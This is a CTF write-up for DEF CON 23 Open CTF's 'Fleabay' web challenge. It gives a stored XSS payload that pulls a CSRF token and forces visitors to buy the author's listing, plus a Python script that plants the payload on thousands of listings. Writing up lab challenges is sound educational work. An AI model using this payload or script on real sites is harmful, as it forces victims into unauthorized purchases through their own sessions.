# CTF write-up: defcon23 open CTF No.07
Challenge | Tags | Point | Author
--- | --- | ---
Fleabay 100 | binary,exploitation,pwnable | 200 | soen

## English

### Challenge description
Fleabay 100 100 --- Fleabay has gotten really popular, and Mr. Moneybags is perusing the listings - can you sell him $100,000 worth of stuff?
10.0.66.91

### write-up
(in progress)

Auctuary this challange is very simmiller to Fleabay challange in last year.

First, access to the web page.

The web service is to sell and buy some images and exchange money.
The ame is ean a big money.
Our strategy is inject javascript code that another user would force parchasing our stuff.

1. Accessing the web.
2. Create account.
3. Regist the image for sale on it.
4. I found I was able to inject some in image url field. 
Point:
```
<img src="(image field)" />
```
To:
```
<img src=""><script>var r=new XMLHttpRequest();r.open('GET','/listing/XXX/',true);r.onload=function(){if(r.status>=200&&r.status<400){var d=r.responseText;var c=d.search('csrf_token=.{12}\"');var t=d.substring(c+11,c+11+12);var s=new XMLHttpRequest();s.open('GET','/listing/XXX/?buy=1&csrf_token='+t,true);s.send();}};r.send();</script><img src="" />
```
XXX is image id.

5. getting authentication information from browser developer tool.
```
csrftoken = "rjQFXg4rkYDnzYSykqXoUmyJ7atzIcxG"
sessionid = "07ze6nb37o5cy1sk8rn55jbpto1skzuv"
```

6. I made auto post script.

exploit.py:
```
import urllib3 # Requires: < 1.9
import re

http = urllib3.PoolManager()
newurl = "http://10.0.66.91/listings/new/"
updateurl = "http://10.0.66.91/listing/%d/edit/"
csrftoken = "rjQFXg4rkYDnzYSykqXoUmyJ7atzIcxG"
sessionid = "07ze6nb37o5cy1sk8rn55jbpto1skzuv"

def do_():
    r = http.request_encode_body('POST', newurl, headers={"Cookie":"csrftoken=%s;sessionid=%s" % (csrftoken, sessionid)}, fields={"name":"Item 1","details":"test","image_src":"test","cost":"%u" % (2**32)-1,"csrfmiddlewaretoken":csrftoken,"submit":"Submit"},encode_multipart=False, redirect=False)
    for urllike in re.finditer(r'http://10.0.66.91/listing/([0-9]+)/', r.headers['location']):
        num = int(urllike.group(1))
        r = http.request_encode_body('POST', updateurl % num, headers={"Cookie":"csrftoken=%s;sessionid=%s" % (csrftoken, sessionid)}, fields={"name":"Item %d" % num,"details":"test","image_src":"\"><script>var r=new XMLHttpRequest();r.open('GET','/listing/%(num)d/',true);r.onload=function(){if(r.status>=200&&r.status<400){var d=r.responseText;var c=d.search('csrf_token=.{12}\"');var t=d.substring(c+11,c+11+12);var s=new XMLHttpRequest();s.open('GET','/listing/%(num)d/?buy=1&csrf_token='+t,true);s.send();}};r.send();</script><img src=\"" % dict(num=num),"cost":"%u" % 4294967295 ,"csrfmiddlewaretoken":csrftoken,"Referer":updateurl % num}, encode_multipart=False, redirect=False)
        return num
    else:
        raise ValueError("unexpected response: %d: %s" % (r.status, r.data.decode('utf-8')))

for i in range(2048):
    num = do_()
    print("[+] placed XSS trap on item #%d" % num)
```

7. run the script and wait.

8. login to page with browser.

9. found the key on the page.

